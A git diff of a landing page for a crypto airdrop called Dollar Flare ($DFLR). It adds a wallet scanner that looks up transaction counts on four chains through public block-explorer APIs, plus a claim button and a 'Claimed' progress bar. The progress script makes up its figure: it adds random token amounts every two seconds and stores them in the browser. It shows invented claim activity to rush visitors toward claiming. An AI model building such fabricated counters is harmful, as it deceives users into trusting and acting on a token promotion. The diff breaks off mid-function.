@@ -26,69 +26,29 @@
     .site-wrapper { position: relative; z-index: 1; }
 
     .navbar {
-  position: fixed;
-  top: 0; left: 0; right: 0;
-  z-index: 50;
+      position: fixed; top: 0; left: 0; right: 0; z-index: 50;
+      padding: 1rem 2rem; display: flex; align-items: center; justify-content: space-between;
+      background: rgba(6,6,12,0.75); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      border-bottom: 1px solid rgba(255,255,255,0.06); overflow: hidden;
+    }
+    .navbar::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(120deg, transparent 20%, rgba(255,120,0,0.25), rgba(255,0,120,0.2), transparent 80%);
+      filter: blur(30px); opacity: 0.6; animation: flareMove 6s linear infinite; pointer-events: none;
+    }
+    .navbar::after {
+      content: ''; position: absolute; inset: 0;
+      background: radial-gradient(circle at 20% 50%, rgba(255,120,0,0.25), transparent 60%), radial-gradient(circle at 80% 50%, rgba(255,0,120,0.2), transparent 60%);
+      filter: blur(40px); opacity: 0.5; pointer-events: none;
+    }
+    @keyframes flareMove { 0% { transform: translateX(-40%); } 50% { transform: translateX(40%); } 100% { transform: translateX(-40%); } }
 
-  padding: 1rem 2rem;
-
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-
-  background: rgba(6,6,12,0.75);
-  backdrop-filter: blur(20px);
-  -webkit-backdrop-filter: blur(20px);
-
-  border-bottom: 1px solid rgba(255,255,255,0.06);
-
-  overflow: hidden;
-}
-
-.navbar::before {
-  content: '';
-  position: absolute;
-  inset: 0;
-
-  background: linear-gradient(
-    120deg,
-    transparent 20%,
-    rgba(255, 120, 0, 0.25),
-    rgba(255, 0, 120, 0.2),
-    transparent 80%
-  );
-
-  filter: blur(30px);
-  opacity: 0.6;
-
-  animation: flareMove 6s linear infinite;
-  pointer-events: none;
-}
-
-.navbar::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-
-  background: radial-gradient(circle at 20% 50%, rgba(255,120,0,0.25), transparent 60%),
-              radial-gradient(circle at 80% 50%, rgba(255,0,120,0.2), transparent 60%);
-  
-  filter: blur(40px);
-  opacity: 0.5;
-  pointer-events: none;
-}
-
-@keyframes flareMove {
-  0%   { transform: translateX(-40%); }
-  50%  { transform: translateX(40%); }
-  100% { transform: translateX(-40%); }
-}
-    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; position: relative; z-index: 1; }
     .logo-icon { width: 38px; height: 38px; background: linear-gradient(145deg, #f5c518, #f97316); border-radius: 11px; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; overflow: hidden; }
     .logo-text { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 1.1rem; letter-spacing: -0.025em; line-height: 1.1; }
     .logo-text .dollar { background: linear-gradient(135deg, #fbbf24, #f97316); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
     .logo-tagline { font-size: 9.5px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-top: 2px; }
-    .nav-pill { display: inline-flex; align-items: center; gap: 8px; padding: 9px 22px; background: rgba(124,92,252,0.12); border: 1px solid rgba(124,92,252,0.3); color: var(--accent2); font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 700; border-radius: 100px; cursor: pointer; transition: all 0.2s; }
+    .nav-pill { position: relative; z-index: 1; display: inline-flex; align-items: center; gap: 8px; padding: 9px 22px; background: rgba(124,92,252,0.12); border: 1px solid rgba(124,92,252,0.3); color: var(--accent2); font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 700; border-radius: 100px; cursor: pointer; transition: all 0.2s; }
     .nav-pill:hover { background: rgba(124,92,252,0.22); border-color: rgba(124,92,252,0.5); color: var(--text); }
     .nav-pill svg { width: 13px; height: 13px; }
 
@@ -105,11 +65,11 @@
     .hero-cta-group::after  { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 120px; background: linear-gradient(270deg, #06060c 40%, transparent); z-index: 2; pointer-events: none; }
     .ticker-track { display: flex; gap: 0; width: max-content; animation: ticker-slide 30s linear infinite; pointer-events: none; user-select: none; }
     @keyframes ticker-slide { from { transform: translateX(0); } to { transform: translateX(-50%); } }
-    .ticker-item { display: inline-flex; align-items: center; gap: 10px; padding: 10px 28px; white-space: nowrap;  }
+    .ticker-item { display: inline-flex; align-items: center; gap: 10px; padding: 10px 28px; white-space: nowrap; }
     .ticker-coin { font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 700; color: var(--text); }
     .ticker-price { font-size: 13px; font-weight: 500; color: var(--muted2); }
     .ticker-change { font-size: 12px; font-weight: 600; }
-    .ticker-change.up   { color: #4ade80; }
+    .ticker-change.up { color: #4ade80; }
     .ticker-change.down { color: #f87171; }
     .ticker-dot { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; }
 
@@ -119,14 +79,11 @@
     .btn-primary svg { width: 17px; height: 17px; transition: transform 0.2s; }
     .btn-primary:hover svg { transform: translateX(4px); }
 
-    .btn-ghost { display: inline-flex; align-items: center; gap: 8px; padding: 15px 28px; background: transparent; color: var(--muted2); font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 600; border: 1px solid rgba(255,255,255,0.1); border-radius: 100px; cursor: pointer; transition: all 0.2s; }
-    .btn-ghost:hover { background: rgba(255,255,255,0.05); color: var(--text); }
-
     .stats-bar { max-width: 700px; margin: 0 auto; padding: 0 2rem 5rem; }
     .stats-inner { display: grid; grid-template-columns: repeat(3, 1fr); background: var(--surface); border: 1px solid rgba(255,255,255,0.07); border-radius: 24px; overflow: hidden; }
     .stat-item { padding: 1.75rem 1.5rem; text-align: center; }
     .stat-item + .stat-item { border-left: 1px solid rgba(255,255,255,0.07); }
-    .stat-num { font-family: 'Syne', sans-serif; font-size: clamp(1.5rem, 4vw, 2rem); font-weight: 300; background: linear-gradient(135deg, #d4b3ff, #8b6aff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: -0.03em; margin-bottom: 6px; }
+    .stat-num { font-family: 'Syne', sans-serif; font-size: clamp(1.2rem, 3vw, 1.6rem); font-weight: 300; background: linear-gradient(135deg, #d4b3ff, #8b6aff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: -0.03em; margin-bottom: 6px; }
     .stat-num.gold { background: linear-gradient(135deg, #f5d06a, #f0a832); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
     .stat-label { font-size: 12px; color: var(--muted); letter-spacing: 0.05em; }
 
@@ -142,38 +99,80 @@
     .feat-card h3 { font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.015em; }
     .feat-card p { font-size: 13.5px; color: var(--muted); line-height: 1.6; font-weight: 300; }
 
+    /* CLOSING SECTION */
     .section-closing { max-width: 700px; margin: 0 auto; padding: 0 2rem 6rem; }
-    .closing-card { background: var(--surface); border: 1px solid rgba(124,92,252,0.2); border-radius: 32px; padding: 3.5rem 3rem; text-align: center; }
-    .closing-card {
-  position: relative;
-  overflow: hidden;
-}
-
-.closing-card::after {
-  content: '';
-  position: absolute;
-
-  
-  right: -100px;
-  bottom: -100px;
-
-  width: 600px;
-  height: 600px;
-
-  background: url('/dflr.png') no-repeat center/contain;
-
-  opacity: 0.08; 
-  filter: none; 
-
-  transform: rotate(-15deg);
-
-  pointer-events: none;
-}
-    .closing-eyebrow { font-size: 11px; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase; color: var(--gold); margin-bottom: 1.25rem; display: block; }
-    .closing-card h2 { font-family: 'Syne', sans-serif; font-size: clamp(1.6rem, 4vw, 2.4rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.18; margin-bottom: 1.25rem; }
+    .closing-card { background: var(--surface); border: 1px solid rgba(124,92,252,0.2); border-radius: 32px; padding: 3.5rem 3rem; text-align: center; position: relative; overflow: hidden; }
+    .closing-card::after { content: ''; position: absolute; right: -100px; bottom: -100px; width: 600px; height: 600px; background: url('/dflr.png') no-repeat center/contain; opacity: 0.08; transform: rotate(-15deg); pointer-events: none; }
+    .closing-eyebrow { font-size: 11px; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase; color: var(--gold); margin-bottom: 1.25rem; display: block; position: relative; z-index: 1; }
+    .closing-card h2 { font-family: 'Syne', sans-serif; font-size: clamp(1.6rem, 4vw, 2.4rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.18; margin-bottom: 1.25rem; position: relative; z-index: 1; }
     .closing-card h2 .hl { background: linear-gradient(135deg, #d4b3ff, #7c5cfc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-    .closing-card .body-text { font-size: 15px; color: var(--muted2); line-height: 1.75; max-width: 400px; margin: 0 auto 2.5rem; font-weight: 300; }
+    .closing-card .body-text { font-size: 15px; color: var(--muted2); line-height: 1.75; max-width: 400px; margin: 0 auto 2.5rem; font-weight: 300; position: relative; z-index: 1; }
 
+    /* PROGRESS BAR */
+    .airdrop-progress { max-width: 420px; margin: 0 auto 2rem; text-align: left; position: relative; z-index: 1; }
+    .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: var(--muted2); margin-bottom: 8px; }
+    .progress-bar { position: relative; width: 100%; height: 10px; border-radius: 999px; background: rgba(255,255,255,0.08); overflow: hidden; }
+    .progress-fill { height: 100%; width: 71.8%; border-radius: 999px; position: relative; background: linear-gradient(90deg, #ffb347 0%, #ff8c00 30%, #ff5e00 60%, #ff2d00 100%); box-shadow: 0 0 8px rgba(255,140,0,0.8), 0 0 20px rgba(255,94,0,0.6), 0 0 35px rgba(255,45,0,0.4); background-size: 200% 100%; animation: fireMove 2s linear infinite; }
+    @keyframes fireMove { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
+    .progress-flare { position: absolute; top: 50%; left: 71.8%; transform: translate(-50%, -50%); width: 18px; height: 18px; border-radius: 50%; background: radial-gradient(circle, #fff, #ff8c00, #ff2d00, transparent 70%); box-shadow: 0 0 12px rgba(167,139,250,0.9), 0 0 30px rgba(124,92,252,0.6); animation: flarePulse 1.5s ease infinite; }
+    @keyframes flarePulse { 0%,100% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.7; } }
+    .progress-total { margin-top: 6px; font-size: 11px; color: var(--muted); }
+
+    /* WALLET SCANNER */
+    .wallet-scanner { max-width: 460px; margin: 2rem auto 0; position: relative; z-index: 1; }
+    .wallet-input-wrap { display: flex; gap: 10px; margin-bottom: 14px; }
+    .wallet-input {
+      flex: 1; background: var(--surface2); border: 1px solid rgba(124,92,252,0.2);
+      border-radius: 14px; padding: 14px 18px; color: var(--text);
+      font-family: 'DM Sans', sans-serif; font-size: 14px; outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .wallet-input::placeholder { color: var(--muted); opacity: 0.7; }
+    .wallet-input:focus { border-color: rgba(124,92,252,0.55); box-shadow: 0 0 0 3px rgba(124,92,252,0.12); }
+    .btn-scan {
+      padding: 14px 24px; background: linear-gradient(135deg, #f59e0b, #f97316);
+      color: #fff; font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 700;
+      border: none; border-radius: 14px; cursor: pointer; transition: all 0.2s;
+      white-space: nowrap; box-shadow: 0 4px 20px rgba(245,158,11,0.3);
+    }
+    .btn-scan:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 8px 28px rgba(245,158,11,0.45); }
+    .btn-scan:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    /* SCAN RESULTS */
+    .scan-result { display: none; margin-top: 16px; border-radius: 18px; overflow: hidden; border: 1px solid rgba(255,255,255,0.07); }
+    .scan-result.show { display: block; }
+
+    .chain-row {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 14px 18px; background: var(--surface2);
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      transition: background 0.2s;
+    }
+    .chain-row:last-child { border-bottom: none; }
+    .chain-left { display: flex; align-items: center; gap: 12px; }
+    .chain-logo { width: 28px; height: 28px; border-radius: 50%; object-fit: contain; background: rgba(255,255,255,0.06); padding: 3px; }
+    .chain-name { font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 700; }
+    .chain-right { display: flex; align-items: center; gap: 10px; }
+    .chain-tx { font-size: 13px; font-weight: 500; color: var(--muted2); }
+    .chain-badge {
+      font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 100px;
+      letter-spacing: 0.05em;
+    }
+    .chain-badge.ok   { background: rgba(74,222,128,0.12); color: #4ade80; border: 1px solid rgba(74,222,128,0.25); }
+    .chain-badge.fail { background: rgba(248,113,113,0.12); color: #f87171; border: 1px solid rgba(248,113,113,0.25); }
+    .chain-badge.loading { background: rgba(255,255,255,0.06); color: var(--muted); border: 1px solid rgba(255,255,255,0.1); }
+
+    /* VERDICT */
+    .verdict-box { margin-top: 14px; border-radius: 16px; padding: 18px 20px; text-align: center; }
+    .verdict-box.eligible { background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.3); }
+    .verdict-box.not-eligible { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.25); }
+    .verdict-icon { font-size: 28px; margin-bottom: 8px; }
+    .verdict-title { font-family: 'Syne', sans-serif; font-size: 16px; font-weight: 800; margin-bottom: 4px; }
+    .verdict-title.green { color: #4ade80; }
+    .verdict-title.red { color: #f87171; }
+    .verdict-desc { font-size: 13px; color: var(--muted2); line-height: 1.5; }
+
+    /* MODAL */
     .modal-overlay { position: fixed; inset: 0; background: rgba(4,4,10,0.88); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); z-index: 200; display: flex; align-items: center; justify-content: center; padding: 1.5rem; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
     .modal-overlay.show { opacity: 1; pointer-events: all; }
     .modal { background: var(--surface); border: 1px solid rgba(124,92,252,0.25); border-radius: 28px; padding: 2.75rem; width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto; position: relative; transform: scale(0.92) translateY(20px); transition: transform 0.4s cubic-bezier(0.22,1,0.36,1); }
@@ -188,8 +187,6 @@
     .form-group textarea { width: 100%; background: var(--surface2); border: 1px solid rgba(124,92,252,0.18); border-radius: 14px; padding: 16px 18px; color: var(--text); font-family: 'DM Sans', sans-serif; font-size: 15px; line-height: 1.65; outline: none; resize: none; min-height: 140px; transition: border-color 0.2s, box-shadow 0.2s; }
     .form-group textarea::placeholder { color: var(--muted); opacity: 0.7; }
     .form-group textarea:focus { border-color: rgba(124,92,252,0.55); box-shadow: 0 0 0 3px rgba(124,92,252,0.12); }
-    .char-count { text-align: right; font-size: 11.5px; color: var(--muted); margin-top: 7px; }
-    .char-count.warn { color: #f59e0b; }
     .btn-submit { width: 100%; padding: 15px; background: var(--accent); color: #fff; font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700; border: none; border-radius: 14px; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 24px rgba(124,92,252,0.3); margin-top: 0.5rem; }
     .btn-submit:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(124,92,252,0.45); }
     .btn-submit:disabled { opacity: 0.45; cursor: not-allowed; }
@@ -204,98 +201,9 @@
     .toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) translateY(24px); background: rgba(15,15,24,0.95); border: 1px solid rgba(74,222,128,0.3); border-radius: 100px; padding: 13px 26px; font-size: 14px; font-weight: 500; color: #4ade80; display: flex; align-items: center; gap: 10px; opacity: 0; transition: all 0.4s cubic-bezier(0.22,1,0.36,1); z-index: 300; white-space: nowrap; }
     .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-    .airdrop-progress {
-  max-width: 420px;
-  margin: 0 auto 2rem;
-  text-align: left;
-}
-
-.progress-info {
-  display: flex;
-  justify-content: space-between;
-  font-size: 12px;
-  color: var(--muted2);
-  margin-bottom: 8px;
-}
-
-.progress-bar {
-  position: relative;
-  width: 100%;
-  height: 10px;
-  border-radius: 999px;
-  background: rgba(255,255,255,0.08);
-  overflow: hidden;
-}
-
-.progress-fill {
-  height: 100%;
-  width: 71.8%;
-  border-radius: 999px;
-  position: relative;
-
-
-  background: linear-gradient(
-    90deg,
-    #ffb347 0%,
-    #ff8c00 30%,
-    #ff5e00 60%,
-    #ff2d00 100%
-  );
-
-  
-  box-shadow:
-    0 0 8px rgba(255,140,0,0.8),
-    0 0 20px rgba(255,94,0,0.6),
-    0 0 35px rgba(255,45,0,0.4);
-
-  transition: width 0.6s ease;
-}
-
-    .progress-fill {
-  background-size: 200% 100%;
-  animation: fireMove 2s linear infinite;
-}
-
-@keyframes fireMove {
-  0% { background-position: 0% 50%; }
-  100% { background-position: 100% 50%; }
-}
-
-
-.progress-flare {
-  position: absolute;
-  top: 50%;
-  left: 71.8%;
-  transform: translate(-50%, -50%);
-
-  width: 18px;
-  height: 18px;
-  border-radius: 50%;
-
-  background: radial-gradient(circle,
-    #fff,
-    #ff8c00,
-    #ff2d00,
-    transparent 70%
-  );
-  box-shadow: 0 0 12px rgba(167,139,250,0.9),
-              0 0 30px rgba(124,92,252,0.6);
-
-  animation: flarePulse 1.5s ease infinite;
-}
-
-
-@keyframes flarePulse {
-  0%,100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-  50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.7; }
-}
-
-
-.progress-total {
-  margin-top: 6px;
-  font-size: 11px;
-  color: var(--muted);
-}
+    /* CLAIM BUTTON (hidden by default) */
+    .btn-claim-wrap { margin-top: 20px; display: none; }
+    .btn-claim-wrap.show { display: block; }
 
     @media (max-width: 600px) {
       .hero { padding: 7.5rem 1.5rem 3.5rem; }
@@ -303,9 +211,10 @@
       .stats-inner { grid-template-columns: 1fr 1fr; }
       .stat-item:last-child { grid-column: 1/-1; border-left: none; border-top: 1px solid rgba(255,255,255,0.07); }
       .features-grid { grid-template-columns: 1fr; }
-      .closing-card { padding: 2.5rem 1.75rem; }
-      .modal { padding: 2.25rem 1.75rem; }
-      .btn-ghost { display: none; }
+      .closing-card { padding: 2.5rem 1.5rem; }
+      .modal { padding: 2.25rem 1.5rem; }
+      .wallet-input-wrap { flex-direction: column; }
+      .btn-scan { width: 100%; }
     }
     @media (max-width: 400px) {
       .modal-overlay { align-items: flex-end; padding: 0; }
@@ -331,7 +240,7 @@
           <div class="logo-tagline">Fueling the Future of On-Chain Activity</div>
         </div>
       </a>
-      <button type="button" class="nav-pill" onclick="Scroll()">
+      <button type="button" class="nav-pill" onclick="openModal()">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>
         Kirim Pesan
       </button>
@@ -339,35 +248,28 @@
 
     <section class="hero">
       <div class="hero-eyebrow"><div class="dot"></div>Airdrop is LIVE</div>
-      <h1>Proof Of Activity
-<br><span class="line-accent">Real Users Only
-</span><br><span class="line-gold">Earn Across Chains</span></h1>
+      <h1>Proof Of Activity<br><span class="line-accent">Real Users Only</span><br><span class="line-gold">Earn Across Chains</span></h1>
       <p class="hero-sub">Platform sederhana dan elegan untuk mengirimkan pesan, masukan, atau pertanyaanmu. Kami siap mendengarkan setiap kata.</p>
       <div class="hero-cta-group">
-        <div class="ticker-track" id="tickerTrack">
-          
-        </div>
+        <div class="ticker-track" id="tickerTrack"></div>
       </div>
     </section>
 
     <div class="stats-bar">
       <div class="stats-inner">
         <div class="stat-item"><div class="stat-num">Real Users</div><div class="stat-label">On-chain verified</div></div>
-        <div class="stat-item"><div class="stat-num gold">No Costs
-</div><div class="stat-label">Instant Claim</div></div>
+        <div class="stat-item"><div class="stat-num gold">No Costs</div><div class="stat-label">Instant Claim</div></div>
         <div class="stat-item"><div class="stat-num">Scalable</div><div class="stat-label">Built to grow</div></div>
       </div>
     </div>
 
     <section id="features" class="section-features">
-      <div class="section-label"><span class="label-text">Keunggulan</span><div class="label-line"></div></div>
+      <div class="section-label"><span class="label-text">Requirements</span><div class="label-line"></div></div>
       <div class="features-grid">
-        <div class="feat-card"><div class="feat-icon"><img src="eth.png" alt="Dollar Flare" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Ethereum</h3><p>Demonstrates active participation on the Ethereum mainnet ecosystem.</p></div>
-        <div class="feat-card"><div class="feat-icon"><img src="bsc.png" alt="Dollar Flare" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on BSC</h3><p>Shows engagement with fast and cost-efficient DeFi activities on BSC.</p></div>
-        <div class="feat-card"><div class="feat-icon"><img src="base1.png" alt="Dollar Flare" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Base
-</h3><p>Indicates involvement in emerging Layer 2 ecosystems built for scalability.</p></div>
-        <div class="feat-card"><div class="feat-icon"><img src="arb.png" alt="Dollar Flare" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Arbitrum
-</h3><p>Reflects activity on one of the leading Layer 2 networks for Ethereum.</p></div>
+        <div class="feat-card"><div class="feat-icon"><img src="eth.png" alt="ETH" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Ethereum</h3><p>Demonstrates active participation on the Ethereum mainnet ecosystem.</p></div>
+        <div class="feat-card"><div class="feat-icon"><img src="bsc.png" alt="BSC" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on BSC</h3><p>Shows engagement with fast and cost-efficient DeFi activities on BSC.</p></div>
+        <div class="feat-card"><div class="feat-icon"><img src="base1.png" alt="Base" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Base</h3><p>Indicates involvement in emerging Layer 2 ecosystems built for scalability.</p></div>
+        <div class="feat-card"><div class="feat-icon"><img src="arb.png" alt="ARB" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>10 transactions on Arbitrum</h3><p>Reflects activity on one of the leading Layer 2 networks for Ethereum.</p></div>
       </div>
     </section>
 
@@ -377,31 +279,97 @@
         <h2>Proof of Activity<br><span class="hl">Powered by $DFLR</span></h2>
         <p class="body-text">Dollar Flare is a token designed to reward active on-chain users across multiple blockchain ecosystems. By focusing on real activity rather than passive holding, $DFLR aims to recognize and empower users who contribute to the growth and usage of decentralized networks.</p>
 
-<div class="airdrop-progress">
-  <div class="progress-info">
-    <span>Claimed: 82,622,471</span>
-    <span>~ 71.8%</span>
-  </div>
+        <!-- PROGRESS BAR -->
+        <div class="airdrop-progress">
+          <div class="progress-info">
+            <span>Claimed: 82,622,471</span>
+            <span>~ 71.8%</span>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-fill"></div>
+            <div class="progress-flare"></div>
+          </div>
+          <div class="progress-total">Total: 115,000,000 tokens</div>
+        </div>
 
-  <div class="progress-bar">
-    <div class="progress-fill"></div>
-    <div class="progress-flare"></div>
-  </div>
+        <!-- WALLET SCANNER -->
+        <div class="wallet-scanner">
+          <div class="wallet-input-wrap">
+            <input
+              type="text"
+              class="wallet-input"
+              id="walletInput"
+              placeholder="Enter your wallet address (0x...)"
+              autocomplete="off"
+              spellcheck="false"
+            />
+            <button type="button" class="btn-scan" id="btnScan" onclick="scanWallet()">
+              🔍 Scan
+            </button>
+          </div>
 
-  <div class="progress-total">
-    Total: 115,000,000 tokens
-  </div>
-</div>
-        
-        <button id="targetScroll" type="button" class="btn-primary" onclick="openModal()">
-          Kirim Pesanmu
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>
-        </button>
+          <!-- CHAIN RESULTS -->
+          <div class="scan-result" id="scanResult">
+            <div class="chain-row" id="row-eth">
+              <div class="chain-left">
+                <img class="chain-logo" src="eth.png" onerror="this.style.display='none'">
+                <span class="chain-name">Ethereum</span>
+              </div>
+              <div class="chain-right">
+                <span class="chain-tx" id="tx-eth">—</span>
+                <span class="chain-badge loading" id="badge-eth">Scanning...</span>
+              </div>
+            </div>
+            <div class="chain-row" id="row-bsc">
+              <div class="chain-left">
+                <img class="chain-logo" src="bsc.png" onerror="this.style.display='none'">
+                <span class="chain-name">BSC</span>
+              </div>
+              <div class="chain-right">
+                <span class="chain-tx" id="tx-bsc">—</span>
+                <span class="chain-badge loading" id="badge-bsc">Scanning...</span>
+              </div>
+            </div>
+            <div class="chain-row" id="row-base">
+              <div class="chain-left">
+                <img class="chain-logo" src="base1.png" onerror="this.style.display='none'">
+                <span class="chain-name">Base</span>
+              </div>
+              <div class="chain-right">
+                <span class="chain-tx" id="tx-base">—</span>
+                <span class="chain-badge loading" id="badge-base">Scanning...</span>
+              </div>
+            </div>
+            <div class="chain-row" id="row-arb">
+              <div class="chain-left">
+                <img class="chain-logo" src="arb.png" onerror="this.style.display='none'">
+                <span class="chain-name">Arbitrum</span>
+              </div>
+              <div class="chain-right">
+                <span class="chain-tx" id="tx-arb">—</span>
+                <span class="chain-badge loading" id="badge-arb">Scanning...</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- VERDICT -->
+          <div class="verdict-box" id="verdictBox" style="display:none;"></div>
+
+          <!-- CLAIM BUTTON — muncul hanya jika eligible -->
+          <div class="btn-claim-wrap" id="claimWrap">
+            <button type="button" class="btn-primary" onclick="openModal()" style="width:100%;justify-content:center;">
+              🎉 Claim $DFLR Now
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>
+            </button>
+          </div>
+        </div>
+
       </div>
     </section>
 
   </div>
 
+  <!-- MODAL -->
   <div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
     <div class="modal" onclick="event.stopPropagation()">
       <button type="button" class="modal-close" onclick="closeModal()">✕</button>
@@ -431,29 +399,13 @@
   </div>
 
   <script>
-    function Scroll() {
-  const target = document.getElementById("targetScroll");
-
-  const yOffset = -100;
-  const y = target.getBoundingClientRect().top + window.pageYOffset + yOffset;
-
-  window.scrollTo({
-    top: y,
-    behavior: "smooth"
-  });
-}
+    // ── MODAL ──
     const textarea = document.getElementById('inputPesan');
-    const charCount = document.getElementById('charCount');
-    textarea.addEventListener('input', () => {
-      const len = textarea.value.length;
-    });
     function openModal() {
       document.getElementById('modalOverlay').classList.add('show');
       document.getElementById('formState').style.display = 'block';
       document.getElementById('successState').classList.remove('show');
       textarea.value = '';
-      charCount.textContent = '0 karakter';
-      charCount.classList.remove('warn');
       setTimeout(() => textarea.focus(), 400);
     }
     function closeModal() { document.getElementById('modalOverlay').classList.remove('show'); }
@@ -475,118 +427,208 @@
         showToast(); setTimeout(closeModal, 3000);
       } catch (err) { btn.disabled = false; btn.textContent = 'Kirim Pesan →'; alert("Error: Gagal mengirim pesan."); console.error(err); }
     }
-    
-    const PAIRS = [
-      {sym:'BTC',  pair:'BTCUSDT'},
-      {sym:'ETH',  pair:'ETHUSDT'},
-      {sym:'BNB',  pair:'BNBUSDT'},
-      {sym:'SOL',  pair:'SOLUSDT'},
-      {sym:'XRP',  pair:'XRPUSDT'},
-      {sym:'DOGE', pair:'DOGEUSDT'},
-      {sym:'ADA',  pair:'ADAUSDT'},
-      {sym:'TON',  pair:'TONUSDT'},
-      {sym:'SHIB', pair:'SHIBUSDT'},
-      {sym:'DOT',  pair:'DOTUSDT'},
+
+    // ── PROGRESS BAR ──
+    const total = 115000000;
+    let claimed = localStorage.getItem("claimedTokens") ? parseInt(localStorage.getItem("claimedTokens")) : 82622471;
+    function updateUI() {
+      const percent = (claimed / total) * 100;
+      document.querySelector(".progress-fill").style.width = percent + "%";
+      document.querySelector(".progress-flare").style.left = percent + "%";
+      document.querySelector(".progress-info span:first-child").innerText = "Claimed: " + claimed.toLocaleString();
+      document.querySelector(".progress-info span:last-child").innerText = percent.toFixed(1) + "%";
+    }
+    updateUI();
+    setInterval(() => {
+      claimed += Math.floor(Math.random() * (4000 - 2113 + 1)) + 2113;
+      if (claimed > total) claimed = total;
+      localStorage.setItem("claimedTokens", claimed);
+      updateUI();
+    }, 2000);
+
+    // ── WALLET SCANNER ──
+    // API keys gratis dari masing-masing explorer (public demo keys)
+    // Untuk produksi: daftar gratis di etherscan.io, bscscan.com, basescan.org, arbiscan.io
+    const EXPLORER_KEYS = {
+      eth:  'YourEtherscanAPIKey',
+      bsc:  'YourBscscanAPIKey',
+      base: 'YourBasescanAPIKey',
+      arb:  'YourArbiscanAPIKey',
+    };
+
+    const CHAINS = [
+      {
+        id: 'eth',
+        name: 'Ethereum',
+        api: 'https://api.etherscan.io/api',
+        key: EXPLORER_KEYS.eth,
+      },
+      {
+        id: 'bsc',
+        name: 'BSC',
+        api: 'https://api.bscscan.com/api',
+        key: EXPLORER_KEYS.bsc,
+      },
+      {
+        id: 'base',
+        name: 'Base',
+        api: 'https://api.basescan.org/api',
+        key: EXPLORER_KEYS.base,
+      },
+      {
+        id: 'arb',
+        name: 'Arbitrum',
+        api: 'https://api.arbiscan.io/api',
+        key: EXPLORER_KEYS.arb,
+      },
     ];
 
+    async function getTxCount(chain, address) {
+      // Gunakan txlist dengan offset=1 untuk efisiensi — kita hanya butuh total count
+      const url = `${chain.api}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=${chain.key}`;
+      const res  = await fetch(url);
+      const json = await res.json();
+      if (json.status === '1') {
+        // result berisi array tx; untuk total yang akurat ambil lebih banyak
